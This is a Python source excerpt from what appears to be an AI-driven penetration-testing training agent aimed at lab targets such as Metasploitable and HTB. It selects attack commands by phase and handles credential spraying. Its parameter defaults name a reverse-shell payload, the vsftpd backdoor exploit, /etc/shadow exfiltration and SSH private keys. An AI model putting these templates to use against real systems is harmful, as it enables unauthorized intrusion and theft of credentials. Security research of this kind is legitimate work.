                f"aggr={_ff15.aggression_controller} sensory={_ff15.sensory_buffer} "
                f"wm={_ff15.working_memory} consol={_ff15.consolidation} "
                f"semidx={_ff15.semantic_index}"
            )
        except Exception as e:
            logger.debug(f"[P15] Init skipped for {agent_name}: {e}")

        # =====================================================================
        # PHASE 16.0: Progress Estimator — Proprioceptive progress sensing.
        # Answers "How close am I to foothold / root?" with two continuous
        # signals. MLP trained from GPT retroactive labels + heuristic bootstrap.
        # Feature-flag gated: FF_PROGRESS_ESTIMATOR (default OFF).
        # =====================================================================
        self._p16_progress_estimator = None
        self._p16_progress_estimate = None
        self._p16_episode_states: list = []
        self._p16_episode_boards: list = []
        try:
            from core.feature_flags import get_feature_flags
            _ff16 = get_feature_flags()
            if _ff16.progress_estimator:
                from core.neuro.progress_estimator import ProgressEstimator
                self._p16_progress_estimator = ProgressEstimator()
                logger.debug(f"[P16] {agent_name}: progress_estimator=ON "
                             f"(dataset={self._p16_progress_estimator.dataset_size}, "
                             f"confidence={self._p16_progress_estimator.confidence:.2f})")
        except Exception as e:
            logger.debug(f"[P16] Init skipped for {agent_name}: {e}")

        self._init_cloud_roles()

        # =====================================================================
        # PHASE 41: Submodule delegation — companion classes for modularity.
        # SmartCoach delegates specific operations to these extracted classes.
        # =====================================================================
        from core.training.coach.anti_repeat import AntiRepeatGuard
        from core.training.coach.evidence_gate import EvidenceGate, EvidenceGateConfig
        from core.training.coach.metrics_tracker import MetricsTracker
        from core.training.coach.episode_lifecycle import EpisodeLifecycle
        from core.training.coach.pipeline_stages import PipelineResult

        self._anti_repeat_guard = AntiRepeatGuard()
        _eg_mode = "enforce"
        try:
            from core.feature_flags import get_feature_flags
            _eg_mode = get_feature_flags().strict_exploit_gate or "enforce"
        except Exception:
            pass
        self._evidence_gate = EvidenceGate(EvidenceGateConfig(mode=_eg_mode))
        self._metrics_tracker = MetricsTracker()
        self._episode_lifecycle = EpisodeLifecycle()

        # ── PHASE 42: Deep wiring — lazy-init placeholders ───────────
        self._dagger_buffer: Optional[object] = None
        self._phase_timeout: Optional[object] = None
        self._ctf_tracker: Optional[object] = None
        self._cred_sprayer: Optional[object] = None
        self._action_grammar: Optional[object] = None
        self._hallucination_guard: Optional[object] = None

        # =====================================================================
        # STRUCTURAL CONSOLIDATION: Orchestration Harmonization Modules
        # DecisionCore — single action authority (Phase 1)
        # MaturityController — single entropy/schedule authority (Phase 2+4)
        # UnifiedRewardPipeline — single reward computation (Phase 3)
        # HarmonyMetrics — cross-algorithm observability (Phase 7)
        # =====================================================================
        self._decision_core = None
        self._maturity_controller = None  # Shared — injected by orchestrator
        self._reward_pipeline = None
        self._harmony_metrics = None
        try:
            from core.decision.decision_core import DecisionCore
            from core.decision.unified_reward import UnifiedRewardPipeline
            from core.decision.harmony_metrics import HarmonyMetrics
            self._decision_core = DecisionCore()
            self._reward_pipeline = UnifiedRewardPipeline()
            self._harmony_metrics = HarmonyMetrics()
            # Register MaturityController as the SOLE entropy writer
            self._harmony_metrics.register_entropy_writer("maturity_controller")
            logger.debug(
                f"[HARMONY] {agent_name}: DecisionCore + RewardPipeline + "
                f"HarmonyMetrics initialized"
            )
        except Exception as e:
            logger.debug(f"[HARMONY] Init partial for {agent_name}: {e}")

        logger.debug(
            f"[P41] {agent_name}: submodule delegation initialized "
            f"(anti_repeat, evidence_gate[{_eg_mode}], metrics, lifecycle)"
        )

    # =========================================================================
    # PHASE 42: Deep Wiring — Lazy Initializers
    # =========================================================================

    def _ensure_dagger_buffer(self) -> Optional[object]:
        """Lazy-init DAggerBuffer if feature flag is on."""
        if self._dagger_buffer is not None:
            return self._dagger_buffer
        try:
            from core.feature_flags import get_feature_flags
            if not get_feature_flags().dagger_wiring:
                return None
            from core.training.dagger import DAggerBuffer
            self._dagger_buffer = DAggerBuffer()
            logger.info("DAggerBuffer wired into SmartCoach")
            return self._dagger_buffer
        except Exception as e:
            logger.warning("DAggerBuffer init failed: %s", e)
            return None

    def _ensure_phase_timeout(self) -> Optional[object]:
        """Lazy-init PhaseTimeoutManager if feature flag is on."""
        if self._phase_timeout is not None:
            return self._phase_timeout
        try:
            from core.feature_flags import get_feature_flags
            if not get_feature_flags().phase_timeout:
                return None
            from core.training.phase_timeout import PhaseTimeoutManager
            self._phase_timeout = PhaseTimeoutManager()
            logger.info("PhaseTimeoutManager wired into SmartCoach")
            return self._phase_timeout
        except Exception as e:
            logger.warning("PhaseTimeoutManager init failed: %s", e)
            return None

    def _ensure_ctf_tracker(self) -> Optional[object]:
        """Lazy-init CTFModeTracker if feature flag is on."""
        if self._ctf_tracker is not None:
            return self._ctf_tracker
        try:
            from core.feature_flags import get_feature_flags
            if not get_feature_flags().ctf_tracker:
                return None
            from core.execution.ctf_mode import CTFModeTracker
            self._ctf_tracker = CTFModeTracker()
            logger.info("CTFModeTracker wired into SmartCoach")
            return self._ctf_tracker
        except Exception as e:
            logger.warning("CTFModeTracker init failed: %s", e)
            return None

    def _ensure_cred_sprayer(self) -> Optional[object]:
        """Lazy-init CredentialSprayer if feature flag is on."""
        if self._cred_sprayer is not None:
            return self._cred_sprayer
        try:
            from core.feature_flags import get_feature_flags
            if not get_feature_flags().credential_sprayer:
                return None
            from core.ops.credential_sprayer import CredentialSprayer
            self._cred_sprayer = CredentialSprayer()
            logger.info("CredentialSprayer wired into SmartCoach")
            return self._cred_sprayer
        except Exception as e:
            logger.warning("CredentialSprayer init failed: %s", e)
            return None

    def _check_phase_timeout(self, phase: int, step: int) -> bool:
        """Check if current phase has timed out. Returns True if force-advance needed."""
        timeout_mgr = self._ensure_phase_timeout()
        if timeout_mgr is None:
            return False
        try:
            timeout_mgr.record_step(phase, step)
            if timeout_mgr.check_timeout(phase, step):
                logger.warning(
                    "Phase %d timed out at step %d — force-advancing", phase, step,
                )
                return True
        except Exception as e:
            logger.warning("PhaseTimeout check failed: %s", e)
        return False

    def get_spray_commands(self) -> list:
        """Get credential spray command candidates for decision pipeline."""
        if self._cred_sprayer is None:
            return []
        try:
            return self._cred_sprayer.get_spray_commands()
        except Exception as e:
            logger.warning("CredentialSprayer get_spray_commands failed: %s", e)
            return []

    def _init_smart_mentor(self):
        """Initialize the smart mentor — GPT-only (Phase 6.9: Venice removed).
        
        Venice was causing f-string format errors with JSON braces in prompts
        and adding complexity without proportional value. All 3 codex model
        variants (local-llm, gpt-4o-mini fallback) are GPT-based.
        """
        try:
            # Phase 6.9: Venice/DualMentor REMOVED — GPT-only pipeline
            self.dual_mentor = None
            
            if hasattr(self.gpt_manager, 'async_client'):
                self.smart_mentor = SmartMentor(
                    llm_client=self.gpt_manager.async_client,
                    learned_store=self.learned_store,
                    model=self.model,
                )
                logger.debug(f"SmartMentor initialized for {self.agent_name}")
            elif hasattr(self.gpt_manager, 'client') and self.gpt_manager.client:
                # Fallback to sync client (SmartMentor handles conversion)
                self.smart_mentor = SmartMentor(
                    llm_client=self.gpt_manager.client,
                    learned_store=self.learned_store,
                    model=self.model,
                )
                logger.debug(f"SmartMentor initialized with sync client for {self.agent_name}")
            else:
                logger.debug(f"No LLM client available, SmartMentor disabled")
        except Exception as e:
            logger.warning(f"Failed to init SmartMentor: {e}")

    def _init_cloud_roles(self):
        """Phase 10.0: Initialize cloud LLM acceleration roles.

        Each role checks its own feature flag. If profile is CLOUD and
        flags are ON, roles are live. Otherwise they return None from
        get_role() and all call sites gracefully skip.
        """
        try:
            from core.llm.cloud_roles import get_role, LLMRole
            self._strategic_planner = get_role(LLMRole.STRATEGIC_PLANNER, self.gpt_manager)
            self._tactical_advisor = get_role(LLMRole.TACTICAL_ADVISOR, self.gpt_manager)
            self._judge_ranker = get_role(LLMRole.JUDGE_RANKER, self.gpt_manager)
            self._postmortem_extractor = get_role(LLMRole.POSTMORTEM_SKILLS, self.gpt_manager)
            self._dagger_corrector = get_role(LLMRole.DAGGER_CORRECTOR, self.gpt_manager)
            active = sum(1 for r in [
                self._strategic_planner, self._tactical_advisor,
                self._judge_ranker, self._postmortem_extractor,
                self._dagger_corrector
            ] if r is not None)
            if active > 0:
                logger.info(f"[CLOUD-ROLES] {self.agent_name}: {active}/5 roles active")
            self._cloud_roles_initialized = True
        except Exception as e:
            logger.debug(f"Cloud roles init skipped for {self.agent_name}: {e}")

    def has_dual_mentor(self) -> bool:
        """Check if dual mentor (GPT + Venice) is available."""
        return hasattr(self, 'dual_mentor') and self.dual_mentor is not None
    
    def init_attack_context(
        self,
        target: str,
        difficulty: str = "unknown",
        platform: str = "unknown",
    ) -> AttackContext:
        """
        Initialize attack context for a new target/episode.
        
        Args:
            target: Target IP or hostname
            difficulty: Target difficulty level
            platform: Target platform (linux, windows, etc.)
            
        Returns:
            Initialized AttackContext
        """
        self.attack_context = AttackContext(
            target=target,
            difficulty=difficulty,
            platform=platform,
            current_phase=AttackPhase.RECON,
        )
        return self.attack_context
    
    def update_context_from_state(
        self,
        state: Dict[str, Any],
    ) -> AttackContext:
        """
        Update attack context from environment state.
        
        Args:
            state: Environment state dictionary
            
        Returns:
            Updated AttackContext
        """
        if not self.attack_context:
            target = state.get("target_ip", "10.10.10.10")
            self.attack_context = AttackContext(target=target)
        
        ctx = self.attack_context
        
        # Update target info
        if "target_ip" in state:
            ctx.target = state["target_ip"]
        
        # DIRECT state_flags from environment (preferred path)
        if "state_flags" in state and isinstance(state["state_flags"], dict):
            for flag, value in state["state_flags"].items():
                if value:  # Only set True flags
                    ctx.set_state_flag(flag)
        
        # Update services from open ports
        if "open_ports" in state:
            for port in state["open_ports"]:
                ctx.add_discovery("open_port", port)
                
                # Auto-detect services from common ports
                port_services = {
                    21: "ftp", 22: "ssh", 23: "telnet",
                    25: "smtp", 53: "dns", 80: "http",
                    110: "pop3", 111: "rpc", 135: "msrpc",
                    139: "netbios", 143: "imap", 443: "https",
                    445: "smb", 993: "imaps", 995: "pop3s",
                    1433: "mssql", 1521: "oracle", 3306: "mysql",
                    3389: "rdp", 5432: "postgresql", 5985: "winrm",
                    5986: "winrm-ssl", 6379: "redis", 8080: "http-alt",
                    8443: "https-alt", 27017: "mongodb",
                }
                
                if port in port_services:
                    ctx.add_service(port_services[port], port)
        
        # Update state flags from services
        if "services" in state:
            for svc in state["services"]:
                if isinstance(svc, dict):
                    svc_name = svc.get("name", "").lower()
                    svc_port = svc.get("port")
                else:
                    svc_name = str(svc).lower()
                    svc_port = None
                
                ctx.add_service(svc_name, svc_port)
        
        # Detection risk
        if "detection_risk" in state:
            ctx.state_flags["high_detection_risk"] = state["detection_risk"] > 0.7
        
        # Credentials and privilege level
        if state.get("credentials_found"):
            ctx.set_state_flag("credentials_known")
        if state.get("privilege_level") == "root":
            ctx.set_state_flag("root_shell_obtained")
            ctx.set_state_flag("shell_obtained")
        elif state.get("privilege_level") == "user":
            ctx.set_state_flag("shell_obtained")
        
        # Platform detection
        if "os" in state:
            ctx.platform = state["os"].lower()
            if "windows" in ctx.platform:
                ctx.platform = "windows"
            elif "linux" in ctx.platform or "unix" in ctx.platform:
                ctx.platform = "linux"
        
        # Track command history - CRITICAL for anti-loop logic
        # First, populate from full history if provided
        if "command_history" in state:
            history_from_state = state["command_history"]
            if isinstance(history_from_state, list):
                # Merge: keep existing ctx.command_history and add new ones
                existing_set = set(ctx.command_history)
                for cmd in history_from_state:
                    if cmd and cmd not in existing_set:
                        ctx.command_history.append(cmd)
                        existing_set.add(cmd)
        # Also append last_command if it's new
        if "last_command" in state:
            last_cmd = state["last_command"]
            if last_cmd and last_cmd not in ctx.command_history[-5:]:
                ctx.command_history.append(last_cmd)
        
        # Update phase based on state
        ctx.current_phase = get_phase_from_state(ctx.state_flags)
        
        return ctx
    
    # =========================================================================
    # PHASE 0.1: STUCK-ESCAPE METHODS
    # =========================================================================
    
    def _get_recent_action_tags(self, k: int = 15) -> Set[str]:
        """
        Get union of tags from the last K actions in command_history.
        
        Phase 0.1: Used for tag-based action masking.
        
        Args:
            k: Number of recent actions to consider
            
        Returns:
            Set of all tags from recent commands
        """
        if not self.attack_context:
            return set()
        
        recent_cmds = self.attack_context.command_history[-k:]
        all_tags = set()
        
        for cmd in recent_cmds:
            # Find the template for this command
            cmd_prefix = cmd.split()[0].lower() if cmd else ""
            
            for template in COMMAND_REGISTRY.values():
                # Match by prefix or template name
                template_prefix = template.template.split()[0].lower()
                if cmd_prefix == template_prefix or template.name.lower() in cmd.lower():
                    all_tags.update(template.tags)
                    break
        
        return all_tags
    
    def _compute_tag_overlap(self, template: "CommandTemplate", recent_tags: Set[str]) -> float:
        """
        Compute Jaccard-like overlap between template tags and recent tags.
        
        Phase 0.1: Used to determine which actions to mask.
        
        Args:
            template: The command template to check
            recent_tags: Tags from recent commands
            
        Returns:
            Overlap ratio (0.0 to 1.0)
        """
        if not template.tags or not recent_tags:
            return 0.0
        
        intersection = len(template.tags & recent_tags)
        union = len(template.tags | recent_tags)
        
        return intersection / union if union > 0 else 0.0
    
    def _get_masked_actions_for_stuck(
        self,
        overlap_threshold: float = 0.8,
        history_k: int = 15,
    ) -> Tuple[List["CommandTemplate"], int, str]:
        """
        Get valid actions after masking those with high tag overlap.
        
        Phase 0.1: Core stuck-escape logic.
        
        Args:
            overlap_threshold: Mask actions with >= this tag overlap
            history_k: Look back K actions for tag calculation
            
        Returns:
            Tuple of (filtered_commands, excluded_count, tag_info_str)
        """
        if not self.attack_context:
            return [], 0, "no_context"
        
        ctx = self.attack_context
        
        # Get recent tags
        recent_tags = self._get_recent_action_tags(history_k)
        
        # Get all valid commands for current state
        valid_commands = get_valid_commands_for_state(ctx.state_flags, ctx.current_phase)
        if not valid_commands:
            valid_commands = get_valid_commands_for_state(ctx.state_flags)
        if not valid_commands:
            valid_commands = [
                cmd for cmd in COMMAND_REGISTRY.values()
                if cmd.phase == AttackPhase.RECON and not cmd.preconditions
            ]
        
        # Filter for agent role
        role_filtered = self._filter_commands_for_role(valid_commands)
        
        # Phase 8.2 Batch 10: Also filter by tool availability
        role_filtered = [cmd for cmd in role_filtered if self._is_tool_available(cmd)]
        
        # Also exclude commands already in history (exact match)
        history_set = set(ctx.command_history[-history_k:])
        
        # Apply tag overlap masking
        masked = []
        excluded_count = 0
        excluded_tags = []
        
        for template in role_filtered:
            overlap = self._compute_tag_overlap(template, recent_tags)
            
            # Check exact history match
            test_cmd = template.template.replace("{target}", ctx.target)
            in_history = any(test_cmd[:40] in h for h in history_set)
            
            if overlap >= overlap_threshold or in_history:
                excluded_count += 1
                excluded_tags.append(f"{template.name}:{overlap:.2f}")
            else:
                masked.append(template)
        
        tag_info = f"recent_tags={list(recent_tags)[:5]} excluded={excluded_tags[:5]}"
        
        return masked, excluded_count, tag_info
    
    def _force_novel_action(
        self,
        step_ctx: "SmartStepContext",
        thresholds: List[float] = [0.8, 0.6, 0.4, 0.0],
    ) -> Optional["SmartDecisionResult"]:
        """
        Force a novel action using fallback ladder of decreasing thresholds.
        
        Phase 0.1: Called when agent is repeat-stuck.
        
        Fallback ladder:
        1. threshold=0.8 → mask high-overlap actions
        2. threshold=0.6 → more permissive
        3. threshold=0.4 → even more permissive
        4. threshold=0.0 → history-only exclusion
        5. random from all valid → last resort
        
        Args:
            step_ctx: Current step context
            thresholds: List of overlap thresholds to try
            
        Returns:
            SmartDecisionResult with forced=True, or None if cap reached
        """
        # R42: Cap forced-novel selections per episode to prevent forced dominance
        if self._forced_novel_count >= self._forced_novel_max:
            logger.debug(
                f"[FORCED-NOVEL][{self.agent_name}] Cap reached ({self._forced_novel_max}), "
                "falling back to PPO/registry instead"
            )
            return None  # Signal caller to use normal pipeline
        
        ctx = step_ctx.attack_context
        history_k = 15  # Could come from config
        
        # Try each threshold in the fallback ladder
        for threshold in thresholds:
            candidates, excluded, tag_info = self._get_masked_actions_for_stuck(
                overlap_threshold=threshold,
                history_k=history_k,
            )
            
            if candidates:
                # Pick randomly from candidates
                import random
                template = random.choice(candidates)
                
                # Render the command
                params = {"target": ctx.target}
                for param in template.required_params:
                    if param not in params:
                        params[param] = self._get_default_param(param, ctx)
                
                rendered = render_command(template, params)
                
                logger.info(
                    f"[FORCED-NOVEL][{self.agent_name}] "
                    f"threshold={threshold} "
                    f"selected={template.name} "
                    f"excluded={excluded} "
                    f"tag_info={tag_info[:80]}"
                )
                
                self._forced_novel_count += 1  # R42: Track for cap enforcement
                
                return SmartDecisionResult(
                    command=rendered,
                    template_name=template.name,
                    params=params,
                    mentor_call=False,
                    phase=ctx.current_phase,
                    confidence=0.6,
                    source="forced",
                    forced=True,
                    forced_reason=f"repeat_stuck_threshold_{threshold}",
                    excluded_count=excluded,
                    tag_info=tag_info,
                )
        
        # Last resort: random from ALL role-valid commands (ignore history)
        logger.debug(f"[FORCED-NOVEL][{self.agent_name}] All thresholds exhausted, picking random")
        
        valid_commands = get_valid_commands_for_state(ctx.state_flags, ctx.current_phase)
        if not valid_commands:
            valid_commands = list(COMMAND_REGISTRY.values())[:20]
        
        role_filtered = self._filter_commands_for_role(valid_commands)
        # Phase 8.2 Batch 10: Filter by tool availability even in last resort
        role_filtered = [cmd for cmd in role_filtered if self._is_tool_available(cmd)]
        if not role_filtered:
            role_filtered = [cmd for cmd in valid_commands[:10] if self._is_tool_available(cmd)]
        
        import random
        template = random.choice(role_filtered) if role_filtered else list(COMMAND_REGISTRY.values())[0]
        
        params = {"target": ctx.target}
        for param in template.required_params:
            if param not in params:
                params[param] = self._get_default_param(param, ctx)
        
        rendered = render_command(template, params)
        
        self._forced_novel_count += 1  # R42: Track for cap enforcement
        
        return SmartDecisionResult(
            command=rendered,
            template_name=template.name,
            params=params,
            mentor_call=False,
            phase=ctx.current_phase,
            confidence=0.3,
            source="forced",
            forced=True,
            forced_reason="random_fallback",
            excluded_count=0,
            tag_info="random_fallback",
        )
    
    def _get_default_param(self, param: str, ctx: "AttackContext") -> str:
        """Get default value for a required parameter.

        Provides sensible defaults for ALL known command template parameters.
        The fallback for truly unknown params is the target IP, but every
        param name used in the 144+ command registry should be listed here
        to avoid mis-substitution (e.g. ports or lport getting an IP value).
        """
        # Target-aware port and credential defaults
        is_ms3 = ctx.target in ("172.28.0.11",) or getattr(ctx, 'difficulty', '') == 'medium'
        is_ms2 = ctx.target in ("172.28.0.10",) and not is_ms3
        if is_ms3:
            # Phase 7.3: VERIFIED — only these ports are open on the real MS3 Docker
            target_ports = "21,22,111,139,445,3306"
            # Phase 7.3: VERIFIED — msfadmin:msfadmin works, vagrant does NOT
            default_user = "msfadmin"
            default_pass = "msfadmin"
            default_rport = "22"
        elif is_ms2:
            target_ports = "21,22,23,25,80,139,445,512,513,514,1099,1524,2049,3306,5432,5900,6667,8180"
            default_user = "msfadmin"
            default_pass = "msfadmin"
            default_rport = "445"
        else:
            # HTB / generic targets — use discovered data only, no default creds
            _disc = getattr(ctx, 'discovered_ports', None) or set()
            target_ports = ",".join(str(p) for p in sorted(_disc)) if _disc else "22,80"
            # Extract credentials from discovery board if available
            _disc_creds = getattr(ctx, 'credentials', None) or set()
            _cred_user, _cred_pass = "", ""
            if isinstance(_disc_creds, (set, list)):
                for _c in _disc_creds:
                    if isinstance(_c, str) and ":" in _c:
                        _cred_user, _cred_pass = _c.split(":", 1)
                        break
            default_user = _cred_user
            default_pass = _cred_pass
            default_rport = "80"
        # Attacker IP — detect tun0 for HTB, gateway convention for lab
        if is_ms2 or is_ms3:
            parts = ctx.target.rsplit(".", 1)
            attacker_ip = f"{parts[0]}.1" if len(parts) == 2 else "172.28.0.1"
        else:
            # HTB: detect tun0 IP dynamically
            import os as _os_sc
            attacker_ip = _os_sc.environ.get("ARIASKA_LHOST", "")
            if not attacker_ip:
                try:
                    import subprocess as _subp_sc
                    _tun = _subp_sc.run(
                        ["ip", "-4", "addr", "show", "tun0"],
                        capture_output=True, text=True, timeout=2,
                    )
                    if _tun.returncode == 0:
                        import re as _re_sc
                        _m = _re_sc.search(r'inet (\d+\.\d+\.\d+\.\d+)', _tun.stdout)
                        if _m:
                            attacker_ip = _m.group(1)
                except Exception:
                    pass
            if not attacker_ip:
                attacker_ip = "10.10.15.20"  # Fallback

        defaults = {
            # ─── Target identifiers ──────────────────────────────
            "target": ctx.target,
            "ip": ctx.target,
            "host": ctx.target,
            "rhost": ctx.target,
            "rhosts": ctx.target,
            "target_range": f"{ctx.target}/24",
            "url": f"http://{ctx.target}",
            "domain": ctx.target,
            "subnet": ctx.target.rsplit(".", 1)[0] if "." in ctx.target else "10.10.10",
            # ─── Ports ───────────────────────────────────────────
            "port": "80",
            "ports": target_ports,
            "rport": default_rport,
            "lport": "4444",
            "num_ports": "100",
            "rate": "5000",
            # ─── Attacker / listener ─────────────────────────────
            "lhost": attacker_ip,
            "attacker": attacker_ip,
            # ─── Credentials ─────────────────────────────────────
            "user": default_user,
            "username": default_user,
            "password": default_pass,
            "userlist": "/usr/share/nmap/nselib/data/usernames.lst",
            "passlist": "/usr/share/nmap/nselib/data/passwords.lst",
            # ─── Wordlists ───────────────────────────────────────
            "wordlist": "/usr/share/dirb/wordlists/common.txt",
            # ─── Metasploit / payloads ───────────────────────────
            "module": "exploit/unix/ftp/vsftpd_234_backdoor",
            "payload": "linux/x86/shell_reverse_tcp",
            "format": "elf",
            "output": "/tmp/payload.elf",
            # ─── SMB / NFS / LDAP ────────────────────────────────
            "share": "tmp",
            "export": "/",
            "mountpoint": "/tmp/nfs_mount",
            "base_dn": "dc=metasploitable,dc=local",
            "community": "public",
            "version": "2c",
            # ─── SSH / auth ──────────────────────────────────────
            "keyfile": "/root/.ssh/id_rsa",
            "hash": "",
            # ─── Web form / injection ────────────────────────────
            "post_data": "username=admin&password=admin",
            "form_path": "/login",
            "form_data": "username=^USER^&password=^PASS^",
            "fail_string": "Invalid",
            # ─── Scanning / enumeration ──────────────────────────
            "query": "exploit",
            "enumerate": "vp,vt,u",
            "templates": "cves/",
            "severity": "medium,high,critical",
            "extensions": "php,html,txt,bak",
            "threads": "10",
            "token": "",
            # ─── Exfiltration / post-exploit ─────────────────────
            "path": "/etc/",
            "file": "/etc/shadow",
            "remote_path": "/tmp/loot/",
            "command": f"/bin/bash -c 'id'",
            "public_key": "ssh-rsa AAAA_placeholder_key root@attacker",
        }
        # Fallback: only use target IP for truly target-like unknown params
        return defaults.get(param, ctx.target)
    
    # =========================================================================
    # PHASE 7.1: FORWARD-ONLY PHASE GATING + EXPLOITED-SERVICE FILTER
    # =========================================================================
    
    # Phase ordering for forward-only gating
    PHASE_ORDER = {
        AttackPhase.RECON: 0,
        AttackPhase.ENUMERATION: 1,
        AttackPhase.EXPLOITATION: 2,
        AttackPhase.PRIVILEGE_ESCALATION: 3,
        AttackPhase.LATERAL_MOVEMENT: 4,
        AttackPhase.POST_EXPLOITATION: 5,
        AttackPhase.EXFILTRATION: 6,
        AttackPhase.CLOSEOUT: 7,
    }
    
    # Exceptions: some backward-phase commands are legitimate
    # e.g., "nmap" in EXPLOITATION if we need to re-scan a new subnet
    PHASE_GATE_EXCEPTIONS = {
        # Commands allowed to run 1 phase behind current phase
        "nmap_service_version",  # Re-scan to verify version during exploitation
        "curl_headers",          # Quick HTTP check during any phase
        "whatweb",               # Quick web fingerprint
    }
    
    def _filter_phase_forward(
        self, commands: List[CommandTemplate], current_phase: AttackPhase
    ) -> List[CommandTemplate]:
        """
        Filter commands to only allow current phase or forward phases.
        
        Phase 7.1: Prevents agents from running RECON commands during EXPLOITATION,
        or EXPLOITATION commands during EXFILTRATION. Forward-only progression.
        
        Args:
            commands: List of candidate commands
            current_phase: The current attack phase
            
        Returns:
            Commands from current phase or ahead (with some exceptions)
        """
        current_order = self.PHASE_ORDER.get(current_phase, 0)
        
        forward_commands = []
        for cmd in commands:
            cmd_order = self.PHASE_ORDER.get(cmd.phase, 0)
            
            # Allow current phase and forward
            if cmd_order >= current_order:
                forward_commands.append(cmd)
            # Phase 7.2: No exceptions during late phases (POST_EXPLOITATION+)
            # Only allow 1-phase-behind exceptions during early/mid phases
            elif (cmd_order >= current_order - 1 
                  and cmd.name in self.PHASE_GATE_EXCEPTIONS
                  and current_order < 5):  # < POST_EXPLOITATION
                forward_commands.append(cmd)
        
        # If filtering removed ALL commands (unusual), allow current phase only
        if not forward_commands:
            forward_commands = [
                cmd for cmd in commands
                if cmd.phase == current_phase
            ]
        
        # If still empty, don't filter — return original
        return forward_commands if forward_commands else commands
    
    def _filter_exploited_services(
        self, commands: List[CommandTemplate], ctx: AttackContext
    ) -> List[CommandTemplate]:
        """
        Filter out exploit commands targeting already-exploited services/ports.
        
        Phase 7.1: If a shell was obtained via FTP exploit, don't run FTP exploits again.
        Uses the discovery_board's exploited_services and exploited_ports sets.
        
        Args:
            commands: List of candidate commands
            ctx: Attack context with discovery board info
            
        Returns:
            Commands that don't target already-exploited services
        """
        exploited_services: Any = ctx.state_flags.get("_exploited_services", set())
        exploited_ports: Any = ctx.state_flags.get("_exploited_ports", set())
        
        if not exploited_services and not exploited_ports:
            return commands
        
        filtered = []
        for cmd in commands:
            # Only filter exploit-phase commands
            if cmd.phase not in (AttackPhase.EXPLOITATION, AttackPhase.PRIVILEGE_ESCALATION):
                filtered.append(cmd)
                continue
            
            # Check if this exploit targets an already-exploited service
            cmd_lower = cmd.name.lower() + " " + (cmd.template.lower() if hasattr(cmd, 'template') else "")
            is_exploiting_done = False
            
            for svc in exploited_services:
                svc_name = str(svc).lower().split("/")[0]
                if svc_name in cmd_lower:
                    is_exploiting_done = True
                    logger.debug(
                        f"[PHASE-GATE] {self.agent_name}: Blocking {cmd.name} — "
                        f"service '{svc}' already exploited"
                    )
                    break
            
            if not is_exploiting_done:
                filtered.append(cmd)
        
        return filtered if filtered else commands
    
    # Commands that search for credentials — redundant once creds are known
    CRED_SEARCH_COMMANDS = {
        "hydra_ssh", "hydra_ftp", "hydra_http", "hydra_mysql",
        "medusa_ssh", "medusa_ftp", "brute_force", "brute_ssh",
        "patator_ssh", "ncrack_ssh", "john_crack", "hashcat_crack",
        "cewl_wordlist", "crunch_wordlist",
    }

    def _filter_creds_aware(
        self, commands: List[CommandTemplate], ctx: AttackContext
    ) -> List[CommandTemplate]:
        """
        Phase 7.2: Remove brute-force/credential-search commands when credentials
        are already known. This prevents wasted cycles AND avoids burning mentor
        reasoning tokens on 'why am I running hydra when I have creds' questions.
        
        Returns:
            Filtered list with credential-search commands removed (if creds known)
        """
        if not ctx.state_flags.get("credentials_known"):
            return commands
        
        filtered = [
            cmd for cmd in commands
            if cmd.name not in self.CRED_SEARCH_COMMANDS
            and not any(kw in cmd.name.lower() for kw in ["brute", "hydra", "crack", "wordlist"])
        ]
        
        if filtered:
            removed = len(commands) - len(filtered)
            if removed > 0:
                logger.debug(
                    f"[CRED-FILTER] {self.agent_name}: Removed {removed} "
                    f"credential-search commands (creds already known)"
                )
            return filtered
        return commands  # Don't remove everything

    def _filter_by_privilege(
        self, commands: List[CommandTemplate], state: Dict[str, Any]
    ) -> List[CommandTemplate]:
        """
        Phase 10.1: Filter commands by privilege requirements.

        Removes commands that require sudo/root when the agent hasn't
        earned those privileges yet. Controlled by FF_PRIVILEGE_GATING.

        Returns:
            Filtered list with privilege-gated commands removed.
        """
        from core.feature_flags import get_feature_flags
        ff = get_feature_flags()
        if not ff.privilege_gating:
            return commands

        from core.commands.privilege import filter_by_privilege, PrivilegeTelemetry
        tel = PrivilegeTelemetry()
        result = filter_by_privilege(commands, state, telemetry=tel)

        if result.filtered:
            logger.debug(
                "[PRIV-FILTER] %s: Removed %d privilege-gated commands: %s",
                self.agent_name,
                len(result.filtered),
                [c.name for c in result.filtered],
            )

        # Store telemetry for later collection
        if not hasattr(self, "_privilege_telemetry"):
            self._privilege_telemetry = PrivilegeTelemetry()
        self._privilege_telemetry.merge(tel)

        if result.allowed:
            return result.allowed
        return commands  # Don't remove everything — safety fallback

    def _ask_mentor_reasoning(
        self, step_ctx: SmartStepContext, question: str
    ) -> Optional[str]:
        """
        Ask codex-mini a quick reasoning question (e.g., 'should I move to next phase?').
        
        Phase 7.1: Token-efficient reasoning check. Uses max_tokens=273 to keep costs low.
        Phase 11.3: Injects output interpretation lessons so agents learn to reason about output.
        Only called when agent is genuinely unsure — not on every step.
        
        Args:
            step_ctx: Current step context
            question: The reasoning question to ask
            
        Returns:
            Short reasoning answer, or None if LLM unavailable
        """
        if not self.gpt_manager or self.gpt_manager.is_offline():
            return None
        
        # Phase 11.0: Budget gate — record token usage for reasoning calls
        if self.budget_controller is not None:
            _phase = step_ctx.attack_context.current_phase
            _pname = _phase.name if hasattr(_phase, 'name') else str(_phase)
            _stag = getattr(self, '_stagnation_steps', 0)
            if not self.budget_controller.can_call_mentor(_pname, stagnation_steps=_stag):
                logger.debug(f"[{self.agent_name}] Reasoning call suppressed by budget gate")
                return None
        
        ctx = step_ctx.attack_context
        # Phase 38: State Integrity Gate — use discovery_board (ground truth)
        # instead of ctx.discoveries which may be stale/empty.
        # Phase 42: Also check step_ctx.discovery_board directly (fallback chain).
        _disc_board_src = getattr(step_ctx, 'state', {}).get('discovery_board', {})
        if not _disc_board_src:
            _disc_board_src = getattr(step_ctx, 'discovery_board', {})
        if not _disc_board_src:
            _disc_board_src = getattr(ctx, 'discovery_board', {})
        _ports = list(_disc_board_src.get("ports", []))[:10] if _disc_board_src else (
            ctx.discoveries.get("ports", []) if isinstance(ctx.discoveries, dict) else []
        )
        _services = list(_disc_board_src.get("services", []))[:5] if _disc_board_src else (
            ctx.services_found if hasattr(ctx, "services_found") else []
        )
        
        # Build enriched prompt with cross-episode learning
        _failures_str = ""
        if self._reasoning_failures:
            _failures_str = f"\nPrevious failures: {'; '.join(self._reasoning_failures[-3:])}"
        _chain_str = ""
        if self._best_chain:
            _best_cmds = self._best_chain["commands"][:5]
            _chain_str = f"\nBest attack chain from past episodes: {' -> '.join(_best_cmds)}"
